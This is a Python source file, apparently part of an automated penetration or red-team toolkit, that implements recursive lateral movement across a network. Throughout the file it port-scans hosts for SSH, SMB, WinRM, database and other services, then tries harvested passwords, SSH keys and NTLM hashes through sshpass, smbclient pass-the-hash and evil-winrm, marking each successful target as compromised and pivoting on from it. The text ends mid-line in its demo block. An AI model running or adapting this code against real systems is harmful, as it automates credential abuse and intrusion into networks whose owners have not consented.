import os
import sys
import json
import time
import socket
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed

def recursive_expand(graph_state=None, max_depth=3, max_hosts=20):
    """Recursive attack graph expansion.
    For each newly compromised host:
      1. Run Phase 2 (situational awareness) on the host
      2. Run Phase 3 (credential harvesting) on the host
      3. Add new credentials to the graph
      4. Plan and execute lateral movement to new targets
      5. Repeat until objective reached or max_depth exceeded
    Returns the expanded graph with all discovered paths.
    """
    if graph_state is None:
        graph_state = {
            'nodes': {}, 'edges': [], 'credentials': [],
            'compromised_queue': [], 'depth': 0, 'objectives': [],
            'expansion_log': [], 'total_pivots': 0,
        }

    def log(msg):
        entry = {'timestamp': time.time(), 'depth': graph_state['depth'], 'message': msg}
        graph_state['expansion_log'].append(entry)
        print(f"[Depth {graph_state['depth']}] {msg}")

    def discover_services(host):
        """Quick service scan on a host."""
        services = []
        high_value_ports = {
            22: 'SSH', 23: 'Telnet', 80: 'HTTP', 135: 'WMI', 443: 'HTTPS',
            445: 'SMB', 1433: 'MSSQL', 3306: 'MySQL', 3389: 'RDP',
            5432: 'PostgreSQL', 5985: 'WinRM', 5986: 'WinRM-SSL',
            6379: 'Redis', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt',
            9200: 'Elasticsearch', 27017: 'MongoDB',
        }
        for port, svc_name in high_value_ports.items():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                if s.connect_ex((host, port)) == 0:
                    services.append({'port': port, 'service': svc_name})
                s.close()
            except Exception:
                pass
        return services

    def try_pivot(src, dst, service, credential):
        """Attempt a single pivot from src to dst."""
        svc = service.get('service', '').lower()
        port = service.get('port', 0)
        user = credential.get('username', '')
        secret = credential.get('secret', '')
        ctype = credential.get('type', 'password')
        use_hash = ctype in ('ntlm_hash', 'hash')

        result = {'src': src, 'dst': dst, 'service': svc, 'port': port,
                  'username': user, 'success': False, 'method': None}

        if svc == 'ssh' and not use_hash:
            try:
                if ctype == 'ssh_key':
                    cmd = ['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ConnectTimeout=5',
                           '-i', secret, f'{user}@{dst}', 'id']
                else:
                    cmd = ['sshpass', '-p', secret, 'ssh', '-o', 'StrictHostKeyChecking=no',
                           '-o', 'ConnectTimeout=5', f'{user}@{dst}', 'id']
                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                result['success'] = proc.returncode == 0
                result['method'] = 'ssh'
                result['output'] = proc.stdout[:200]
            except Exception:
                pass

        elif svc == 'smb' and use_hash:
            try:
                cmd = ['smbclient', '-L', f'//{dst}', '-U', f'{user}%{secret}', '--pw-nt-hash', '-t', '5']
                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                result['success'] = 'Sharename' in proc.stdout
                result['method'] = 'pth_smb'
            except Exception:
                pass

        elif svc == 'winrm':
            try:
                if use_hash:
                    cmd = ['evil-winrm', '-i', dst, '-u', user, '-H', secret.split(':')[-1]]
                else:
                    cmd = ['evil-winrm', '-i', dst, '-u', user, '-p', secret]
                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=10, input='whoami\nexit\n')
                result['success'] = 'Evil-WinRM' in proc.stdout
                result['method'] = 'winrm'
            except Exception:
                pass

        elif svc in ('rdp', 'mysql', 'postgresql', 'mssql', 'redis'):
            result['method'] = f'{svc}_pending'
            result['note'] = f'{svc} pivot requires protocol-specific handler'

        return result

    # Main expansion loop
    while graph_state['depth'] < max_depth:
        graph_state['depth'] += 1
        compromised = [ip for ip, node in graph_state['nodes'].items() if node.get('compromised')]

        if not compromised:
            log('No compromised hosts to expand from')
            break

        new_compromises = []
        for src_ip in compromised:
            if graph_state['nodes'][src_ip].get('expanded'):
                continue
            graph_state['nodes'][src_ip]['expanded'] = True
            log(f'Expanding from {src_ip}')

            # Step 1: Discover neighbors
            # In a real scenario, this would scan the local subnet from the compromised host
            # Here we check all known non-compromised nodes
            for target_ip, target_node in graph_state['nodes'].items():
                if target_node.get('compromised') or target_ip == src_ip:
                    continue

                # Discover services if not already known
                if not target_node.get('services'):
                    services = discover_services(target_ip)
                    target_node['services'] = services

                # Try each credential against each service
                for cred in graph_state['credentials']:
                    for svc in target_node.get('services', []):
                        result = try_pivot(src_ip, target_ip, svc, cred)
                        graph_state['edges'].append(result)
                        graph_state['total_pivots'] += 1

                        if result['success']:
                            log(f'SUCCESS: {src_ip} -> {target_ip} via {result["method"]} as {cred["username"]}')
                            target_node['compromised'] = True
                            target_node['compromise_method'] = result['method']
                            target_node['compromise_from'] = src_ip
                            new_compromises.append(target_ip)
                            break  # Move to next target
                    if target_node.get('compromised'):
                        break  # Already compromised, no need to try more creds

                if len(new_compromises) + len(compromised) >= max_hosts:
                    log(f'Max hosts ({max_hosts}) reached')
                    break

        # Check objectives
        for obj in graph_state['objectives']:
            if graph_state['nodes'].get(obj['target'], {}).get('compromised'):
                obj['achieved'] = True
                log(f'OBJECTIVE ACHIEVED: {obj["description"]}')

        if all(obj['achieved'] for obj in graph_state['objectives'] if graph_state['objectives']):
            log('All objectives achieved')
            break

        if not new_compromises:
            log('No new hosts compromised this round, stopping expansion')
            break

    # Summary
    total_compromised = sum(1 for n in graph_state['nodes'].values() if n.get('compromised'))
    total_nodes = len(graph_state['nodes'])
    graph_state['summary'] = {
        'depth_reached': graph_state['depth'],
        'total_nodes': total_nodes,
        'compromised_nodes': total_compromised,
        'total_pivots_attempted': graph_state['total_pivots'],
        'successful_pivots': sum(1 for e in graph_state['edges'] if e.get('success')),
        'objectives_achieved': sum(1 for o in graph_state['objectives'] if o['achieved']),
        'total_objectives': len(graph_state['objectives']),
    }
    return graph_state

if __name__ == '__main__':
    # Demo with a small graph
    state = {
